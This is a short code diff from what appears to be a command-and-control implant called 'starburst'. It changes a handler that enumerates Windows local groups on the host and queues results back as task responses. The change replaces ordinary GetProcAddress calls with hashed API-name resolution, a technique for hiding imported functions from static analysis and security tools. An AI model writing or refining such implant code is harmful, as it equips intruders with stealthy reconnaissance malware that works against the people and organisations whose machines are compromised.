@@ -33,11 +33,11 @@ auto declfn starburst::cmd_net_localgroup(
     }
 
     auto pNetLocalGroupEnum = reinterpret_cast<fn_NetLocalGroupEnum>(
-        inst.kernel32.GetProcAddress( h_netapi,
-            symbol<LPCSTR>( "NetLocalGroupEnum" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_netapi ),
+            expr::hash_string( "NetLocalGroupEnum" ) ) );
     auto pNetApiBufferFree = reinterpret_cast<fn_NetApiBufferFree>(
-        inst.kernel32.GetProcAddress( h_netapi,
-            symbol<LPCSTR>( "NetApiBufferFree" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_netapi ),
+            expr::hash_string( "NetApiBufferFree" ) ) );
     if ( !pNetLocalGroupEnum || !pNetApiBufferFree ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "API resolution failed" ) ) );
